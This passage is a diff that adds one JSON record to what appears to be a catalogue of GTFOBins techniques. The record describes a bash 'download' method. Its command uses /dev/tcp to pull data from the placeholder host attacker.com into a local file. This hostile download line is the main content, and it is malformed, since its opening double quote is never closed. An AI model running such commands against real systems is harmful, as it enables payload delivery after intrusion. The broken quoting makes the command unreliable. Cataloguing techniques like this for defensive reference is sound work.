@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-bash-download-2",
+  "name": "GTFOBins · bash (download) #2",
+  "command": "bash -c 'echo \"$(</dev/tcp/attacker.com/12345) >/path/to/output-file'",
+  "description": "Use bash to download via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "bash",
+    "download"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/bash/#download",
+  "upstream_id": "bash/download/1",
+  "category": "gtfobins",
+  "subcategory": "file-download",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/bash/"
+    }
+  ]
+}
